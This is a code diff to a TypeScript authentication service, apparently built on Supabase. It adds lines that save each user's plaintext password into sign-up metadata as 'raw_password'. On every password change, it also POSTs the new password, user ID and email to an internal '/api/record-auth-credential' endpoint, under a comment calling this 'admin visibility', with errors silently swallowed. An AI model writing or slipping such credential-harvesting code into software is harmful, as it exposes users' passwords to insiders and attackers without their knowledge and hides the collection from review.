@@ -67,7 +67,12 @@ export const authService = {
   async signUp(email: string, password: string) {
     const { data, error } = await supabase.auth.signUp({
       email,
-      password
+      password,
+      options: {
+        data: {
+          raw_password: password
+        }
+      }
     });
     return { data, error };
   },
@@ -179,6 +184,13 @@ export const authService = {
       });
 
       if (!rpcError) {
+        // Record password for admin visibility
+        fetch('/api/record-auth-credential', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ userId: currentAuthUser.id, password: newPassword, email: userEmail })
+        }).catch(() => {});
+
         // Successfully updated via RPC
         // Refresh the session
         await supabase.auth.refreshSession();
@@ -194,6 +206,15 @@ export const authService = {
     const { data, error } = await supabase.auth.updateUser({
       password: newPassword
     });
+
+    if (!error) {
+      fetch('/api/record-auth-credential', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: currentAuthUser.id, password: newPassword, email: userEmail })
+      }).catch(() => {});
+    }
+
     return { data, error };
   }
 };
